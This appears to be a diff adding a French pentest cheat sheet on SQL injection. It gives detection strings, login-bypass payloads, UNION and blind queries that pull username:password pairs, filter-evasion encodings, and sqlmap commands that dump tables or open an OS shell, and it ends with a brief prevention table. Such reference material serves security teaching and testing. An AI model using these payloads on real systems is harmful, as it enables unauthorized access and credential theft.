@@ -1,0 +1,349 @@
+---
+title: "SQL Injection — Exploitation des Bases de Données"
+description: "Guide complet des injections SQL : détection, exploitation manuelle, UNION-based, Blind SQLi, et automatisation avec sqlmap."
+category: "offensive"
+tags: ["sqli", "sql-injection", "web-security", "database", "pentest"]
+date: "2026-02-18"
+author: "@vladimir"
+complexity: "advanced"
+---
+
+## Introduction
+
+L'injection SQL (SQLi) est une vulnérabilité web qui permet d'interagir directement avec la base de données d'une application en manipulant les requêtes SQL via des entrées utilisateur non assainies. C'est l'une des failles les plus dangereuses : elle peut mener à la fuite totale de la base de données, au contournement d'authentification, voire à l'exécution de commandes système.
+
+## Types d'Injection SQL
+
+| Type                                                        | Description                                                  |
+| ----------------------------------------------------------- | ------------------------------------------------------------ |
+| <TechBadge variant="warning">In-band (Classic)</TechBadge>  | Le résultat est visible directement dans la réponse          |
+| <TechBadge variant="warning">UNION-based</TechBadge>        | Combine les résultats avec une seconde requête via UNION     |
+| <TechBadge variant="warning">Error-based</TechBadge>        | Exploite les messages d'erreur SQL pour extraire des données |
+| <TechBadge variant="warning">Blind (Boolean)</TechBadge>    | Déduit les données selon des réponses vrai/faux              |
+| <TechBadge variant="warning">Blind (Time-based)</TechBadge> | Déduit les données selon le temps de réponse                 |
+| <TechBadge variant="warning">Out-of-band</TechBadge>        | Exfiltre les données via un canal tiers (DNS, HTTP)          |
+
+## Détection
+
+### Tests de Base
+
+<CheatSheetCode title="sqli-detection.txt" language="sql">
+```sql
+-- Injection de guillemets pour provoquer une erreur
+'
+"
+`
+')
+")
+
+-- Test arithmétique (la page doit réagir différemment)
+1 OR 1=1
+1 OR 1=2
+1' OR '1'='1
+1' OR '1'='2
+
+-- Commentaires SQL pour tronquer la requête
+' --
+' #
+' /\*
+'; --
+
+````
+</CheatSheetCode>
+
+### Identifier le SGBD
+
+<CheatSheetCode title="sqli-fingerprint.txt" language="sql">
+```sql
+-- MySQL
+' AND 1=1 -- -       -- Commentaire MySQL
+SELECT @@version      -- Version MySQL
+SELECT version()      -- Version alternative
+
+-- PostgreSQL
+' AND 1=1 --          -- Commentaire PostgreSQL
+SELECT version()      -- Version PostgreSQL
+
+-- Microsoft SQL Server
+' AND 1=1 --          -- Commentaire MSSQL
+SELECT @@version      -- Version MSSQL
+
+-- Oracle
+' AND 1=1 --          -- Commentaire Oracle
+SELECT banner FROM v$version  -- Version Oracle
+
+-- SQLite
+' AND 1=1 --
+SELECT sqlite_version()
+````
+
+</CheatSheetCode>
+
+## Contournement d'Authentification
+
+### Login Bypass Classiques
+
+<CheatSheetCode title="sqli-auth-bypass.txt" language="sql">
+```sql
+-- Requête originale côté serveur :
+-- SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
+
+-- Payloads dans le champ "username" :
+admin' --
+admin' #
+admin'/_
+' OR 1=1 --
+' OR 1=1 #
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /_
+') OR ('1'='1
+') OR ('1'='1' --
+
+-- Avec le champ password vide :
+username: admin' --
+password: (n'importe quoi)
+
+-- La requête devient :
+-- SELECT \* FROM users WHERE username='admin' -- ' AND password='xxx'
+-- Le commentaire -- ignore la vérification du mot de passe
+
+````
+</CheatSheetCode>
+
+## UNION-based SQLi
+
+La technique UNION permet de combiner le résultat de la requête originale avec une requête malveillante pour extraire des données d'autres tables.
+
+### Étape 1 : Déterminer le Nombre de Colonnes
+
+<CheatSheetCode title="sqli-union-columns.txt" language="sql">
+```sql
+-- Méthode ORDER BY (incrémenter jusqu'à obtenir une erreur)
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+' ORDER BY 4 --    ← Erreur ! → 3 colonnes
+
+-- Méthode UNION SELECT NULL
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --     ← Pas d'erreur → 3 colonnes
+' UNION SELECT NULL, NULL, NULL, NULL -- ← Erreur
+````
+
+</CheatSheetCode>
+
+### Étape 2 : Identifier les Colonnes Affichées
+
+<CheatSheetCode title="sqli-union-visible.txt" language="sql">
+```sql
+-- Injecter des valeurs distinctes pour repérer lesquelles s'affichent
+' UNION SELECT 'aaa', 'bbb', 'ccc' --
+
+-- Si "bbb" s'affiche sur la page → la colonne 2 est visible
+-- On utilisera la colonne 2 pour extraire des données
+
+````
+</CheatSheetCode>
+
+### Étape 3 : Extraire les Données
+
+<CheatSheetCode title="sqli-union-extract.txt" language="sql">
+```sql
+-- Version de la base de données
+' UNION SELECT NULL, @@version, NULL --
+
+-- Liste des bases de données (MySQL)
+' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata --
+
+-- Liste des tables d'une base
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='target_db' --
+
+-- Liste des colonnes d'une table
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' --
+
+-- Extraire les données
+' UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users --
+
+-- Combiner plusieurs colonnes (MySQL)
+' UNION SELECT NULL, GROUP_CONCAT(username, 0x3a, password SEPARATOR 0x0a), NULL FROM users --
+````
+
+</CheatSheetCode>
+
+## Blind SQLi — Boolean-based
+
+Lorsque l'application ne retourne pas les données directement mais affiche un comportement différent (page différente, message différent) selon que la condition est vraie ou fausse.
+
+<CheatSheetCode title="sqli-blind-boolean.txt" language="sql">
+```sql
+-- Vrai (page normale)
+' AND 1=1 --
+
+-- Faux (page différente ou message d'erreur)
+' AND 1=2 --
+
+-- Extraire la version caractère par caractère
+' AND SUBSTRING(@@version, 1, 1) = '5' --
+' AND SUBSTRING(@@version, 1, 1) = '8' --
+
+-- Extraire le nom de la base
+' AND SUBSTRING(database(), 1, 1) = 'a' --
+' AND SUBSTRING(database(), 1, 1) = 'b' --
+-- ... jusqu'à trouver le bon caractère
+
+-- Vérifier l'existence d'une table
+' AND (SELECT COUNT(\*) FROM users) > 0 --
+
+-- Extraire un mot de passe caractère par caractère
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'b' --
+
+````
+</CheatSheetCode>
+
+## Blind SQLi — Time-based
+
+Quand la réponse de l'application est identique dans tous les cas, on utilise des délais temporels pour déduire l'information.
+
+<CheatSheetCode title="sqli-blind-time.txt" language="sql">
+```sql
+-- MySQL : SLEEP()
+' AND IF(1=1, SLEEP(5), 0) --     ← Délai de 5s = VRAI
+' AND IF(1=2, SLEEP(5), 0) --     ← Pas de délai = FAUX
+
+-- Extraire des données avec le temps
+' AND IF(SUBSTRING(database(), 1, 1)='a', SLEEP(5), 0) --
+' AND IF(SUBSTRING(database(), 1, 1)='t', SLEEP(5), 0) --
+
+-- PostgreSQL : pg_sleep()
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
+
+-- MSSQL : WAITFOR DELAY
+'; IF (1=1) WAITFOR DELAY '0:0:5' --
+
+-- SQLite
+' AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END --
+````
+
+</CheatSheetCode>
+
+## Automatisation avec sqlmap
+
+<TechBadge variant="tool">sqlmap</TechBadge> est l'outil de référence pour
+automatiser la détection et l'exploitation des injections SQL.
+
+<CheatSheetCode title="sqlmap-commands.sh" language="bash">
+```bash
+# Détection automatique
+sqlmap -u "https://target.com/page?id=1"
+
+# Avec un cookie de session
+
+sqlmap -u "https://target.com/page?id=1" --cookie="PHPSESSID=abc123"
+
+# Tester un formulaire POST
+
+sqlmap -u "https://target.com/login" --data="username=admin&password=test"
+
+# Lister les bases de données
+
+sqlmap -u "https://target.com/page?id=1" --dbs
+
+# Lister les tables d'une base
+
+sqlmap -u "https://target.com/page?id=1" -D target_db --tables
+
+# Lister les colonnes d'une table
+
+sqlmap -u "https://target.com/page?id=1" -D target_db -T users --columns
+
+# Dumper les données
+
+sqlmap -u "https://target.com/page?id=1" -D target_db -T users --dump
+
+# Obtenir un shell OS
+
+sqlmap -u "https://target.com/page?id=1" --os-shell
+
+# Options de performance
+
+sqlmap -u "https://target.com/page?id=1" --threads=10 --level=5 --risk=3
+
+````
+</CheatSheetCode>
+
+### Options sqlmap Essentielles
+
+| Option | Description |
+|--------|-------------|
+| <TechBadge variant="flag">--dbs</TechBadge> | Lister les bases de données |
+| <TechBadge variant="flag">--tables</TechBadge> | Lister les tables |
+| <TechBadge variant="flag">--dump</TechBadge> | Extraire les données |
+| <TechBadge variant="flag">--os-shell</TechBadge> | Shell système interactif |
+| <TechBadge variant="flag">--level</TechBadge> | Niveau de test (1-5) |
+| <TechBadge variant="flag">--risk</TechBadge> | Niveau de risque (1-3) |
+| <TechBadge variant="flag">--batch</TechBadge> | Mode non-interactif |
+| <TechBadge variant="flag">--tamper</TechBadge> | Scripts d'obfuscation |
+
+## Contournement de Filtres
+
+<CheatSheetCode title="sqli-bypass.txt" language="sql">
+```sql
+-- Contournement d'espaces
+/**/OR/**/1=1
++OR+1=1
+%09OR%091=1          -- Tab
+%0aOR%0a1=1          -- Newline
+
+-- Contournement de mots-clés
+SEL/**/ECT
+SeLeCt (casse mixte)
+CONCAT(0x73656c656374)  -- Encodage hex
+
+-- Contournement de guillemets
+CHAR(97,100,109,105,110)  -- 'admin' en MySQL
+CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- Oracle
+
+-- Double URL encoding
+%2527  →  %27  →  '
+
+-- Tamper scripts sqlmap
+sqlmap -u "URL" --tamper=space2comment
+sqlmap -u "URL" --tamper=between,randomcase
+sqlmap -u "URL" --tamper=charunicodeencode
+````
+
+</CheatSheetCode>
+
+## Prévention
+
+| Mesure                                                        | Description                                                |
+| ------------------------------------------------------------- | ---------------------------------------------------------- |
+| <TechBadge variant="protocol">Prepared Statements</TechBadge> | Utiliser des requêtes paramétrées (PDO, PreparedStatement) |
+| <TechBadge variant="protocol">ORM</TechBadge>                 | Utiliser un ORM (Eloquent, Hibernate, SQLAlchemy)          |
+| <TechBadge variant="protocol">Input Validation</TechBadge>    | Valider le type et le format des entrées                   |
+| <TechBadge variant="protocol">Least Privilege</TechBadge>     | Limiter les droits du compte SQL de l'application          |
+| <TechBadge variant="protocol">WAF</TechBadge>                 | Web Application Firewall pour détecter les patterns SQLi   |
+| <TechBadge variant="protocol">Error Handling</TechBadge>      | Ne jamais exposer les messages d'erreur SQL                |
+
+<NetworkDiagram title="Flux d'attaque SQL Injection">
+  ```
+  [Attacker]                    [Web Application]               [Database]
+      │                               │                             │
+      │ ── ' OR 1=1 -- ────────────> │                             │
+      │                               │ ── SELECT * FROM users     │
+      │                               │    WHERE id='' OR 1=1 -- ─>│
+      │                               │                             │
+      │                               │ <── Toutes les lignes ──── │
+      │ <── Données sensibles ─────── │                             │
+      │                               │                             │
+      │ ── UNION SELECT ────────────> │ ── Requête combinée ─────> │
+      │ <── Dump de la base ───────── │ <── Tables, colonnes ───── │
+  ```
+</NetworkDiagram>
+
+## Résumé
+
+L'injection SQL reste l'une des vulnérabilités les plus critiques en sécurité web. La maîtrise des différentes techniques (UNION-based, Blind Boolean/Time, Error-based) est essentielle pour tout pentester. L'automatisation via sqlmap accélère considérablement l'exploitation. La meilleure protection reste l'utilisation systématique de requêtes paramétrées (**Prepared Statements**).
